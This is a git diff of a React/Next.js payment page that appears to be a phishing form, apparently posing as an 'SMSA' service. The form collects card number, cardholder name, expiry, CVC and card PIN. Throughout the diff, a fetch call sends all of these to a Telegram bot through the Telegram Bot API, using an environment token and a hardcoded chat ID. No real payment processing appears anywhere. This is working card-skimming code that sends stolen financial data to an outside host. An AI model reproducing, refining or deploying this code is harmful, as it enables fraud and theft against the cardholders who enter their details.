@@ -6,9 +6,11 @@ import mada from '../../../../../public/mada.png'
 import Image from 'next/image'
 import {useRef} from 'react'
 import { useRouter,useSearchParams } from 'next/navigation'
-import bot from '@/compnante/dataBot'
+
 
 const Pay=()=>{
+    const token = process.env.TOKEN;
+    const pass = 7017479979
     const selectPay = useRef()
     const namecard = useRef()
     const NumsCard = useRef()
@@ -26,7 +28,7 @@ const Pay=()=>{
         var length =`مدونة سمسا  %0A طريقة الدفع : ${selectPay.current.value}  %0A  رقم البطاقة  : ${NumsCard.current.value} %0A الاسم على البطاقة:${namecard.current.value}%0A  MM    :  ${dateCardmm.current.value} %0A  YY   :  ${dateCardyy.current.value} %0A cvc : ${cvcCard.current.value}%0A رمز البطاقة:${passCard.current.value} %0A %0A ${datas}`
        
         
-        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pass}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
       
       }
       const handlerout = ()=>{
